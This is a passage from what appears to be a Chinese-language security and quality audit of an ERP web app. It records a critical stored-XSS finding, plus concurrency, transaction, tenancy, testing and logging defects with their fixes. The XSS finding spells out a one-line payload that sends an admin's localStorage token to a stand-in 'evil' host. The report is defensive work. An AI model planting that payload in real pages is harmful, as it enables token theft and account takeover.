二、致命级问题（必须立即处理）

致命SEC-001　打印模板存储型跨站脚本攻击（账号接管）

这是一条「写入无门槛 + 入库不净化 + 渲染不转义」三处叠加的完整攻击链，组合起来即可窃取管理员令牌、冒充超管。

证据链：
① 渲染未净化：src/components/common/PrintPreview.tsx:85 用 dangerouslySetInnerHTML 直接渲染打印模板页眉/页脚 HTML，仅做 {now} 字符串替换，无任何净化。
② 写入无角色门槛：functions/api/print-templates/index.ts:304-307（POST）、[id].ts:35,114（PUT/DELETE）只调 getUserFromRequest（任意本组织登录用户均可），无角色校验（对比 users/[id].ts:22 有 ADMIN_ROLES 校验）。
③ 任意 HTML 原样入库：functions/api/print-templates/index.ts:234 的 pickTemplate 仅用正则抽 base64 图片，<script>、<img onerror>、<svg onload> 等恶意 HTML 原样写入 header_html/footer_html。
④ 令牌暴露面：令牌持久化于 localStorage（src/services/api.ts:19、src/stores/persistStorage.ts:27），非 httpOnly。

影响（确证可利用）：组织内最低权限用户提交含 <img src=x onerror="fetch('//evil',{body:localStorage.getItem('ssa-erp-auth-token')})"> 的模板 → 该模板为组织级共享（全员可见）→ 管理员打开任意单据打印预览时脚本在其登录态执行 → 窃取令牌 → 接管全组织。

修复建议：① 打印模板写接口加管理员角色校验；② 模板 HTML 入库前用 DOMPurify 净化（或改为结构化字段而非裸 HTML）；③ 令牌改 httpOnly Cookie 或至少缩短有效期、加刷新机制，缩小跨站脚本影响面。

三、严重级问题

3.1　数据层与持久化（DB）

严重DB-001　父子表工厂模块级全局被并发请求污染 → 你看到的「500」根因

functions/_shared/parentChild.ts:240-244,209,466,546 —— let jsonCols = new Set() 是模块级全局；每次请求入口 collectJsonCols(cfg) 改写它；pickCols/parentToApi 把模块全局当 jsonSet 用。Cloudflare Workers 同一进程内并发请求会共享该全局。

影响：并发下请求 A 的 JSON 列集合被请求 B 覆盖 → A 的数组字段被判为非 JSON 列而裸绑定给数据库 → D1_TYPE_ERROR 运行期 500；反向则把标量误序列化。这正是 projects / sales_prospects / purchase_requests 在并发下报 500 的真因（你之前截图里「创建失败」即此）。

修复：把 jsonSet 作为参数显式传入 pickCols / parentToApi，删除模块级可变全局。

严重DB-002　主表 + 子表明细多步写未包事务 → 部分写入脏数据

functions/_shared/parentChild.ts:470-490（创建）、557-573（更新） —— 先 INSERT 父表（单独 run），再 batch 子表，两步独立 await，任一步失败父行已成孤儿，无回滚。
functions/api/bom/index.ts:280,293 —— BOM 头 INSERT 与明细 batch 非原子。
functions/api/vouchers/index.ts:106,112-123 —— 凭证头 INSERT 后，分录行在 for 循环里逐条单独 await，中途失败则头存而分录不全。

影响：网络抖动/并发下产生「父有子无」「头有明细无」的脏数据，且代码返回 500 但已落库，排查困难。

修复：父表与子表写操作纳入同一 DB.batch 事务；凭证分录改用单条 batch 而非循环 await。

严重DB-003　多租户唯一约束范围错误（跨组织互相阻拦）

migrations/0007_p1_phase5.sql:10 voucher_no TEXT NOT NULL UNIQUE（全局）；:78 order_no TEXT NOT NULL UNIQUE（全局）。正确写法应为 UNIQUE(org_id, xxx)（见 0006:50、0005:46 等）。
migrations/0002_vendors.sql:7 vendor_code 全局 UNIQUE，而 0016_vendor_master.sql:43 是 UNIQUE(org_id, vendor_code) —— 两套口径冲突。

影响：多租户下组织 A 用了某单号，组织 B 再用同名单号触发全局唯一冲突 → 误报 409、跨组织数据互相阻拦，是租户隔离的设计缺陷。

修复：迁移中将全局 UNIQUE 改为 UNIQUE(org_id, 单号)；供应商表统一一套口径。需评估存量数据去重。

3.2　前端质量与测试（FE）

严重FE-001　前端零单元测试，白盒覆盖约等于 0

package.json 无任何 vitest / jest / testing-library 依赖，无 test 脚本（仅有 test:prod-e2e / check）；test/d1 仅 2 个后端 API 契约测试。85 个 Playwright 端到端用例均为黑盒界面路径。

影响：表单计算、金额/税率、状态机、store 数据处理全部无白盒验证；一旦重构即无回归保护。

修复：优先为 any 重灾区（w1Api / 各 store reducer / 金额计算）补单元测试；引入轻量测试框架。

严重FE-002　系统性静默失败：b2Api 返回 null + 约 54 处空 catch

src/services/b2Api.ts:1-11 —— 设计层即「任何异常都 return null，绝不抛；调用方 fire-and-forget + .catch(()=>{})」。
空 catch 集中分布：warehouseStore.ts（17 处）、warehouseAdvancedStore.ts（13 处）、financeStore.ts（9 处）、materialStore.ts（4 处）等。

影响：本地 zustand 状态与数据库真相源可永久分歧且用户零感知（如入库写入失败本地 id 永不回写）。这是数据一致性最危险的架构问题。

修复：消除 b2Api 的「吞错」设计，改为失败可观测（错误提示 + 重试 + 上报）；catch 必须处理或上抛。

严重FE-003　any 类型泛滥（441 处），编译期保护被架空

全仓 : any 219 处 + as any 131 处。根在 src/utils/case.ts:3 snakeToCamel<T=any> 被 20+ store 当「安全解析」滥用。重灾区：w1Api.ts:6-26、financeStore.ts:178（凭证解析全 any）、warehouseStore.ts:607-625、PriceComparison.tsx:23-160（比价逻辑在 any 上动态挂属性）、purchaseStore.ts:114。

影响：Vite 仅 esbuild 不校验未定义引用，加上 any 把后端契约「合法化」，类型错误全部逃逸到运行期白屏或 500（此前多次线上 500 即此机制产物）。

修复：从解析根（w1Api / snakeToCamel / rowToX）开始加接口类型或 zod 校验，逐步收敛 any。

严重FE-004　端到端测试仅 happy-path，无负面/边界用例

e2e/v34-p1-finance.spec.ts:10-69 等用例全部断言「可见性/成功文案/无 pageerror」；抽样 85 个 spec / 307 个 test 均无表单校验失败、403 越权、空数据、负数/超长/精度边界、并发写冲突、网络中断回滚、双写失败路径。

影响：「宽而浅」的覆盖让人误以为稳，实际异常路径完全无保障。

修复：补充负面与边界用例，尤其覆盖权限拒绝、并发、断网重连。

严重FE-005　超大文件与复制粘贴型技术债（仓库级）

超大文件（>800 行）：services/apiService.ts:1623、pages/Settings/SecurityCenterTab.tsx:1502、pages/Purchase/OrderForm.tsx:1240、stores/warehouseStore.ts:1214、pages/Material/MaterialForm.tsx:1239 等。重复样板：rowToX(row:any) 与 readableError(e:any) 在 7+ store 各写一份。

影响：单文件过度膨胀导致评审困难、易引入回归；同逻辑多份维护，改一处漏一处。

修复：抽取通用 rowToX / 错误归一化工具；超大文件按职责拆分。

四、中等级问题

中等SEC-002　审计留痕缺口：账号/密码/会话生命周期无记录

auth/register.ts:66,72（建账号/组织）、auth/activate.ts:62-77（超管激活改密）、auth/reset-password-confirm.ts:44-51（找回密码重置）、auth/change-password.ts:66-77（改密）均写数据但无 writeAudit 调用（对比 users/[id].ts:139 有完整审计）。

影响：凭据变更与账号创建无痕，发生安全事件时无法追溯「谁建了哪个组织/谁重置了谁的密码」。

修复：敏感写操作统一接入审计日志。

中等DB-005　迁移脚本 DROP + CREATE 无 IF NOT EXISTS（重放丢数据）

migrations/0054_finance_domain_fix.sql:42-50 先 DROP TABLE IF EXISTS 再直接 CREATE TABLE（无 IF NOT EXISTS）。对照 0053/0055/0061 均用 CREATE TABLE IF NOT EXISTS。

影响：若迁移在存量数据存在后被重放，三张表数据全丢。

修复：统一用幂等写法；已发布环境禁止重放此类破坏性迁移。

中等DB-006　通用实体路由不序列化 JSON 列（与父子表工厂口径不一致）

functions/_shared/entities.ts:566-576 的 pickSnake 直接 vals.push(body[c.camel]) 不序列化；而 backflush_items / items / member_org_ids / lines 均为 TEXT(JSON) 列（迁移 0028/0035/0065 确证）。

影响：前端传数组/对象即裸绑定 → D1_TYPE_ERROR；与父子表工厂 toJsonValue 处理不一致，属架构级隐患。

修复：统一 JSON 列序列化出口。

中等DB-007　凭证接口写入不存在的列 → 500

functions/api/vouchers/index.ts:84-86,92 fields 含 'reversed'，但 vouchers 表（0007/0064）从无此列 → INSERT 报 no such column: reversed。

影响：请求体带 reversed 字段时必现 500。属「代码与数据库契约脱节」典型。

修复：对齐字段；建立列名一致性自动核对（已有 check-consistency 门禁可扩展）。

中等DB-008　fin_project_accounts 缺唯一约束 → 可重复创建

migrations/0054:102-127 建表无 UNIQUE(org_id, account_no)；finConfig.ts:96 假定冲突检测，但工厂的 UNIQUE 分支因缺约束永不命中。

影响：可重复创建相同 account_no 的核算单（脏数据）。

修复：补组织级唯一约束。

中等DB-009 / FE-006　「查重后插入」依赖库级唯一约束，并发脆弱；persist 水合竞态

各 create 端点均为「先 SELECT 再 INSERT」，正确性完全依赖约束存在（DB-009）。前端 auditStore.ts:145-156 migrate 原地改参、financeLedgerStore.ts:197 persisted:any，且大量 store 仍 persist + b2Api 双写（FE-006）。

影响：并发下可能重复创建；本地持久态与远端真相源存在「先加载本地旧态、异步回写被吞失败」的竞态，用户可能看到陈旧数据。

修复：关键唯一约束必须落库；梳理 persist 与远端双写的一致性策略。

中等FE-007 / FE-008　跨 store 单点耦合、中央 API 客户端无错误归一化

notificationStore.ts:9-13 聚合依赖 5 个 store；api.ts:62-75 中央 CRUD 无统一错误归一化，401 时 window.location.href='/login' 硬跳转。

影响：导入链变更有回归风险；401 硬跳转会丢失未保存表单、未 await 调用产生未处理 rejection。

修复：解耦通知聚合；API 客户端统一错误包装与跳转时机。
